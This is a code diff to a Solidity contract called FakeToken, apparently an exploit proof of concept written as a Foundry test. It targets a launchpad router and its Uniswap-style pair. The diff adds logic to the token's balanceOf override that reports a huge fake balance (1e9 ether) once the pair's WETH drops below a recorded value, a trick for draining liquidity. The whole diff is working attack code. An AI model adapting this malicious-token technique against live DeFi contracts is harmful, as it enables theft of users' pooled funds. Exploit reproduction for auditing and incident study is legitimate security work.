@@ -46,7 +46,8 @@ contract FakeToken is ERC20, Test {
 
 
     uint256 beFunky = 0;
-
+    uint256 prebalance;
+    address pair;
     constructor() {
     }
 
@@ -62,15 +63,36 @@ contract FakeToken is ERC20, Test {
         if (msg.sender == address(ROUTER) && beFunky == 1) {
             return 1e9 ether;
         }
-        if (msg.sender == address(ROUTER) && beFunky == 2) {
-            console.log("FUCK");
+        if (WETH.balanceOf(address(pair)) < prebalance && prebalance > 0 && beFunky == 1) {
+            return 1e9 ether;
         }
         return 1e14;
     }
 
     function transfer(address to, uint256 value) public override returns (bool) {
         beFunky += 1;
+        if (beFunky == 1) {
+            prebalance = WETH.balanceOf(address(to));
+            console.log("prebalance", prebalance);
+        }
         return super.transfer(to, value);
+    }
+    // returns sorted token addresses, used to handle return values from pairs sorted in this order
+    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {
+        require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES');
+        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
+        require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS');
+    }
+
+    // calculates the CREATE2 address for a pair without making any external calls
+    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
+        (address token0, address token1) = sortTokens(tokenA, tokenB);
+        pair = address(uint160(uint256(keccak256(abi.encodePacked(
+                hex'ff',
+                factory,
+                keccak256(abi.encodePacked(token0, token1)),
+                hex'e260b72768e8ec6814aa811c576f346d208ba00840f835949d65c6424ac80a8d' // init code hash
+            )))));
     }
 
     function initialize() external payable {
@@ -78,6 +100,8 @@ contract FakeToken is ERC20, Test {
         _mint(address(this), 10 ether);
 
         ROUTER.launch{value: 10}(address(this), 1e14, 0, 0, 0, 0, 255, 255, address(this));
+
+        pair = FACTORY.getPair(address(this), address(WETH));
     }
 
 
